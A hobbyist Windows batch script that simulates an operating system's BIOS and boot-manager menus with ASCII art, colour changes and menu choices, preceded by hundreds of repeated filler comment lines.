:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:: 1010101101010
:IB
cls
echo.
timeout 2 > nul
cls
:BIOS
color 1b
cls
echo.
echo.
echo             ²²²²²²²²²²²²²²²²²²²²²²²²²
echo             ²² _____ BIOS _______  ²²ÛÛ                         Operating system made in batch file and python thanks to notepad++ for coding the python things.
ECHO             ²² [ 1/Disk         ]  ²²ÛÛ
echo             ²² [ CORE: INTEL    ]  ²²ÛÛ
echo             ²² [ 2/exit         ]  ²²ÛÛ
echo             ²²²²²²²²²²²²²²²²²²²²²²²²²ÛÛ
ECHO               ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
choice /c 12 > nul
if %errorlevel% == 1 echo Using XDRIVE.sys with 91% free! & pause & goto BIOS
if %errorlevel% == 2 goto pegg

:pegg
color 0
goto log

:trb
insertbmp /p:"b.bmp" /x:0 /y:0 /z:100
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ= Boot Manager =ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo.
echo     Choose advanced options for: XSOFT OS
echo.  
cmdMenuSel f870 "Change Product Key" "Back"
if %ERRORLEVEL% == 1 goto enter
if %ERRORLEVEL% == 2 goto bootmgr

      
